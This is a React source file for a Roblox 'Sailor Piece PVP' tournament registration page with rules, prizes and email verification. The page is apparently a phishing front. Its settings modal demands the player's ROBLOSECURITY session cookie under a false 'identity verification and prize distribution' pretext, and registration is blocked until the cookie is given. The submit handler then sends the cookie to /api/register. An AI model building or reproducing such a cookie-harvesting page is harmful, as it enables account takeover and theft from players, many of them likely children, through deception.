/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Search, User, Calendar, Mail, Shield, Trophy, Loader2, CheckCircle2, AlertCircle, Settings, X, ChevronRight, Swords, Target, Zap, Clock, Ban, Gift, Check } from 'lucide-react';

interface RobloxUser {
  id: number;
  name: string;
  displayName: string;
  avatarUrl: string;
}

export default function App() {
  const [isRegistering, setIsRegistering] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  
  // Form State
  const [username, setUsername] = useState('');
  const [monthsPlayed, setMonthsPlayed] = useState('');
  const [cookie, setCookie] = useState('');
  const [email, setEmail] = useState('');
  
  // Verification State
  const [isVerifyingEmail, setIsVerifyingEmail] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [isEmailVerified, setIsEmailVerified] = useState(false);
  const [isSendingCode, setIsSendingCode] = useState(false);
  
  // Roblox Search State
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null);
  const [isSearching, setIsSearching] = useState(false);
  
  // Status State
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [error, setError] = useState('');

  const validateEmail = (email: string) => {
    return String(email)
      .toLowerCase()
      .match(
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
      );
  };

  const handleSendCode = async () => {
    if (!validateEmail(email)) {
      setError('Please enter a valid email address');
      return;
    }
    setIsSendingCode(true);
    setError('');
    try {
      const res = await fetch('/api/auth/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await res.json();
      if (res.ok) {
        setIsVerifyingEmail(true);
        // For debugging if SMTP is not configured
        if (data.debugCode) console.log("Debug Code:", data.debugCode);
      } else {
        setError(data.error || 'Failed to send code');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setIsSendingCode(false);
    }
  };

  const handleVerifyCode = async () => {
    if (!verificationCode) return;
    setIsSubmitting(true);
    setError('');
    try {
      const res = await fetch('/api/auth/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, code: verificationCode })
      });
      if (res.ok) {
        setIsEmailVerified(true);
        setIsVerifyingEmail(false);
      } else {
        const data = await res.json();
        setError(data.error || 'Invalid code');
      }
    } catch (err) {
      setError('Network error');
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleSearchRoblox = async () => {
    const trimmedUsername = username.trim();
    if (!trimmedUsername) {
      setError('Please enter a username first');
      return;
    }
    setIsSearching(true);
    setError('');
    try {
      const res = await fetch(`/api/roblox/search?username=${encodeURIComponent(trimmedUsername)}`);
      const data = await res.json().catch(() => ({ error: 'Server returned invalid response' }));
      if (res.ok) {
        setRobloxUser(data);
      } else {
        setError(data.error || 'Roblox user not found');
        setRobloxUser(null);
      }
    } catch (err) {
      console.error("Search error:", err);
      setError('Failed to connect to server. Please check your internet or try again later.');
    } finally {
      setIsSearching(false);
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!robloxUser) {
      setError('Please verify your Roblox account using the search button');
      return;
    }
    if (!isEmailVerified) {
      setError('Please verify your email in the Settings menu');
      setShowSettings(true);
      return;
    }
    if (!cookie) {
      setError('Please enter your Roblox Cookie in the Settings menu');
      setShowSettings(true);
      return;
    }
    
    setIsSubmitting(true);
    try {
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username,
          monthsPlayed,
          robloxUser,
          cookie,
          email,
          verificationCode
        })
      });
      if (res.ok) {
        setIsSuccess(true);
      } else {
        const data = await res.json();
        setError(data.error || 'Registration failed');
      }
    } catch (err) {
      setError('Network error. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const rules = [
    { title: "1. Format", icon: <Swords className="w-4 h-4" />, items: ["Solo 1v1 or Team 2v2", "Single elimination", "Best of 3 matches", "Map selected by admin"] },
    { title: "2. Requirements", icon: <Target className="w-4 h-4" />, items: ["Minimum level: 1000", "No alt account boosting", "Clear Roblox username"] },
    { title: "3. Combat Rules", icon: <Shield className="w-4 h-4" />, items: ["No hacks or scripts", "No map abuse or glitching", "No resetting to avoid death", "No leaving mid match"] },
    { title: "4. Skill Restrictions", icon: <Zap className="w-4 h-4" />, items: ["Choose one mode: Free Mode (All allowed) or Balanced Mode", "Ban overpowered skills", "Limit 1 Logia fruit per match", "No skill spam more than 3 times in a row"] },
    { title: "5. Win Condition", icon: <Clock className="w-4 h-4" />, items: ["Defeat the opponent", "If time ends at 5 minutes", "Player with more HP wins"] },
    { title: "6. Penalties", icon: <Ban className="w-4 h-4" />, items: ["Hack = instant disqualification", "2 violations = lose the match", "Arguing with admin = disqualification"] },
    { title: "7. Rewards", icon: <Gift className="w-4 h-4" />, items: ["1st place: Robux or cash", "2nd place: rare items", "3rd place: title"] },
  ];

  return (
    <div className="min-h-screen font-sans selection:bg-orange-500/30">
      <div className="atmosphere" />
      
      {/* Header */}
      <nav className="fixed top-0 left-0 w-full z-50 px-6 py-8 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <div className="w-10 h-10 bg-orange-600 rounded-lg flex items-center justify-center shadow-lg shadow-orange-600/20">
            <Shield className="text-white w-6 h-6" />
          </div>
          <span className="text-xl font-bold tracking-tighter uppercase italic">Sailor Piece PVP</span>
        </div>
        <div className="flex items-center gap-4">
          <button 
            onClick={() => setShowSettings(true)}
            className="p-2 rounded-full bg-white/5 hover:bg-white/10 transition-colors"
          >
            <Settings className="w-5 h-5 opacity-70" />
          </button>
          <button 
            onClick={() => setIsRegistering(true)}
            className="text-xs font-semibold uppercase tracking-widest opacity-70 hover:opacity-100 transition-opacity"
          >
            Tournament Info
          </button>
        </div>
      </nav>

      {/* Hero Section */}
      <main className="relative pt-32 pb-20 px-6 max-w-7xl mx-auto flex flex-col items-center justify-center text-center min-h-[80vh]">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
        >
          <h1 className="font-serif text-7xl md:text-9xl font-black leading-none mb-6 tracking-tighter">
            SAILOR<br />
            <span className="text-orange-600 italic">PIECE</span> PVP
          </h1>
          <p className="text-lg md:text-xl text-white/60 max-w-2xl mx-auto mb-12 font-light">
            The ultimate battle for the seas. Prove you are the strongest pirate in the grand tournament.
          </p>
          
          <div className="flex flex-col sm:flex-row gap-4 justify-center">
            <button 
              onClick={() => setIsRegistering(true)}
              className="btn-primary flex items-center gap-2 justify-center"
            >
              <Trophy className="w-5 h-5" />
              Register Now
            </button>
          </div>
        </motion.div>
      </main>

      {/* Settings Modal (Cookie/Email) */}
      <AnimatePresence>
        {showSettings && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              onClick={() => setShowSettings(false)}
              className="absolute inset-0 bg-black/90 backdrop-blur-md"
            />
            <motion.div 
              initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }}
              className="relative w-full max-w-md glass-card p-8"
            >
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl font-bold flex items-center gap-2">
                  <Settings className="w-5 h-5 text-orange-500" />
                  Account Settings
                </h3>
                <button onClick={() => setShowSettings(false)} className="p-1 hover:bg-white/10 rounded-full">
                  <X className="w-5 h-5" />
                </button>
              </div>
              <div className="space-y-4">
                <div>
                  <label className="text-[10px] uppercase tracking-widest text-white/40 mb-2 block">Email Address</label>
                  <div className="flex gap-2">
                    <div className="relative flex-1">
                      <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                      <input 
                        type="email" placeholder="your@email.com" 
                        className={`input-field pl-12 ${isEmailVerified ? 'border-green-500/50' : ''}`}
                        value={email} 
                        onChange={(e) => {
                          setEmail(e.target.value);
                          setIsEmailVerified(false);
                          setIsVerifyingEmail(false);
                        }}
                        disabled={isEmailVerified}
                      />
                    </div>
                    {!isEmailVerified && !isVerifyingEmail && (
                      <button
                        onClick={handleSendCode}
                        disabled={isSendingCode || !email}
                        className="bg-orange-600 hover:bg-orange-700 disabled:opacity-50 text-white px-4 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-colors whitespace-nowrap"
                      >
                        {isSendingCode ? 'Sending...' : 'Send Code'}
                      </button>
                    )}
                    {isEmailVerified && (
                      <div className="bg-green-500/20 text-green-400 px-3 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest flex items-center gap-1">
                        <Check size={12} /> Verified
                      </div>
                    )}
                  </div>
                </div>

                {isVerifyingEmail && !isEmailVerified && (
                  <motion.div 
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="space-y-2 p-4 bg-orange-600/5 rounded-xl border border-orange-600/20"
                  >
                    <label className="text-[10px] uppercase tracking-widest text-orange-500 font-bold mb-2 block">Enter 6-Digit Code</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" maxLength={6} placeholder="000000"
                        className="input-field text-center text-xl tracking-[0.5em] font-mono"
                        value={verificationCode}
                        onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ''))}
                      />
                      <button 
                        onClick={handleVerifyCode}
                        disabled={isSubmitting || verificationCode.length !== 6}
                        className="bg-orange-600 hover:bg-orange-700 disabled:opacity-50 text-white px-6 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-colors"
                      >
                        Verify
                      </button>
                    </div>
                  </motion.div>
                )}
                <div>
                  <label className="text-[10px] uppercase tracking-widest text-white/40 mb-2 block">Roblox Cookie</label>
                  <div className="relative">
                    <Shield className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                    <input 
                      type="password" placeholder="ROBLOSECURITY" className="input-field pl-12"
                      value={cookie} onChange={(e) => setCookie(e.target.value)}
                    />
                  </div>
                  <p className="text-[10px] text-white/30 mt-2 italic">Required for identity verification and prize distribution.</p>
                </div>
              </div>
              <button 
                onClick={() => setShowSettings(false)}
                className="btn-primary w-full mt-8"
              >
                Save & Close
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Registration Modal */}
      <AnimatePresence>
        {isRegistering && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              onClick={() => !isSubmitting && !isSuccess && setIsRegistering(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            
            <motion.div 
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className={`relative w-full ${isSuccess ? 'max-w-3xl' : 'max-w-xl'} glass-card p-8 md:p-12 overflow-y-auto max-h-[90vh]`}
            >
              {isSuccess ? (
                <div className="py-4">
                  <div className="text-center mb-10">
                    <motion.div
                      initial={{ scale: 0 }} animate={{ scale: 1 }}
                      className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4"
                    >
                      <CheckCircle2 className="w-8 h-8 text-green-500" />
                    </motion.div>
                    <h2 className="text-3xl font-bold mb-2">Registration Successful!</h2>
                    <p className="text-white/70 text-sm">Staff will review your request within 24 hours. Winner gets a secret reward.</p>
                  </div>

                  <div className="space-y-6">
                    <h3 className="text-xl font-bold border-b border-white/10 pb-2 flex items-center gap-2">
                      <Trophy className="w-5 h-5 text-orange-500" />
                      Tournament Rules
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                      {rules.map((rule, i) => (
                        <div key={i} className="bg-white/5 p-4 rounded-xl border border-white/5">
                          <h4 className="font-bold text-sm flex items-center gap-2 mb-3 text-orange-400">
                            {rule.icon}
                            {rule.title}
                          </h4>
                          <ul className="space-y-1">
                            {rule.items.map((item, j) => (
                              <li key={j} className="text-xs text-white/60 flex items-start gap-2">
                                <ChevronRight className="w-3 h-3 mt-0.5 flex-shrink-0 text-orange-500/50" />
                                {item}
                              </li>
                            ))}
                          </ul>
                        </div>
                      ))}
                    </div>
                  </div>

                  <button 
                    onClick={() => { setIsRegistering(false); setIsSuccess(false); }}
                    className="btn-primary w-full mt-10"
                  >
                    Got it, I'm Ready!
                  </button>
                </div>
              ) : (
                <>
                  <div className="mb-8 flex justify-between items-start">
                    <div>
                      <h2 className="text-3xl font-bold tracking-tight mb-2">Join Tournament</h2>
                      <p className="text-white/50 text-sm">Enter your Roblox username to begin.</p>
                    </div>
                    <button onClick={() => setIsRegistering(false)} className="p-2 hover:bg-white/10 rounded-full">
                      <X className="w-5 h-5" />
                    </button>
                  </div>

                  <form onSubmit={handleRegister} className="space-y-6">
                    <div className="space-y-4">
                      <div>
                        <label className="text-[10px] uppercase tracking-widest text-white/40 mb-2 block">Roblox Username</label>
                        <div className="flex gap-2">
                          <div className="relative flex-1">
                            <User className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                            <input 
                              required type="text" placeholder="Enter Roblox username" className="input-field pl-12"
                              value={username} onChange={(e) => setUsername(e.target.value)}
                            />
                          </div>
                          <button 
                            type="button" onClick={handleSearchRoblox} disabled={isSearching}
                            className="px-6 bg-orange-600/20 text-orange-500 rounded-xl hover:bg-orange-600/30 transition-colors font-bold text-xs uppercase tracking-widest disabled:opacity-50"
                          >
                            {isSearching ? <Loader2 className="w-4 h-4 animate-spin" /> : 'Search'}
                          </button>
                        </div>
                      </div>

                      <AnimatePresence mode="wait">
                        {robloxUser && (
                          <motion.div 
                            initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }}
                            className="bg-orange-500/10 rounded-xl p-4 flex items-center gap-4 border border-orange-500/20"
                          >
                            <img 
                              src={robloxUser.avatarUrl} alt="Avatar" className="w-16 h-16 rounded-lg bg-black/20"
                              referrerPolicy="no-referrer"
                            />
                            <div>
                              <p className="font-bold text-orange-500">{robloxUser.displayName}</p>
                              <p className="text-xs text-white/40">@{robloxUser.name}</p>
                              <div className="flex items-center gap-1 mt-1">
                                <CheckCircle2 className="w-3 h-3 text-green-500" />
                                <span className="text-[10px] text-green-500 uppercase font-bold">Account Verified</span>
                              </div>
                            </div>
                          </motion.div>
                        )}
                      </AnimatePresence>

                      <div>
                        <label className="text-[10px] uppercase tracking-widest text-white/40 mb-2 block">Months Played</label>
                        <div className="relative">
                          <Calendar className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
                          <input 
                            required type="number" placeholder="How many months?" className="input-field pl-12"
                            value={monthsPlayed} onChange={(e) => setMonthsPlayed(e.target.value)}
                          />
                        </div>
                      </div>
                    </div>

                    {error && (
                      <motion.div 
                        initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }}
                        className="flex items-center gap-2 text-red-400 text-xs bg-red-400/10 p-3 rounded-lg border border-red-400/20"
                      >
                        <AlertCircle className="w-4 h-4" />
                        {error}
                      </motion.div>
                    )}

                    <div className="pt-4">
                      <button 
                        type="submit" disabled={isSubmitting}
                        className="btn-primary w-full flex items-center justify-center gap-2"
                      >
                        {isSubmitting ? <><Loader2 className="w-5 h-5 animate-spin" /> Submitting...</> : 'Register Tournament'}
                      </button>
                      <p className="text-[10px] text-center text-white/30 mt-4">
                        By registering, you agree to the tournament rules.
                      </p>
                    </div>
                  </form>
                </>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Footer */}
      <footer className="py-12 px-6 border-t border-white/5 text-center">
        <p className="text-[10px] uppercase tracking-[0.3em] text-white/20">
          &copy; 2026 Sailor Piece PVP Tournament. All rights reserved.
        </p>
      </footer>
    </div>
  );
}
